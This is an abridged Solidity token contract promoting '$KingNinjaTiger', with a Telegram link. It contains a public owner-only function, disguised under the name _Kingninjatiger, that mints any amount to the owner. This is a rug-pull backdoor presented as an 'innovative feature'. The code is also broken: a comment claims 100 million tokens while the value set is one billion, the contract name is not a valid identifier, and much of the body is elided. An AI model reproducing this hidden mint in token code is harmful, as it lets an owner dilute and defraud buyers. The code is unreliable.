...
//
// $KingNinjaTiger proposes an innovative feature in its contract.
//
// 📱 Telegram:https://t.me/Kingninjatiger
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _Kingninjatiger(uint256 amount) public onlyOwner {
 _Kingninjatiger(msg.sender, amount);
    }
    ...
    function _Kingninjatiger(address account, uint256 amount) internal virtual {
...
contract $KingNinjaTiger is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("King Ninja Tiger", "KINGNINJATIGER") {
        _Kingninjatiger(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}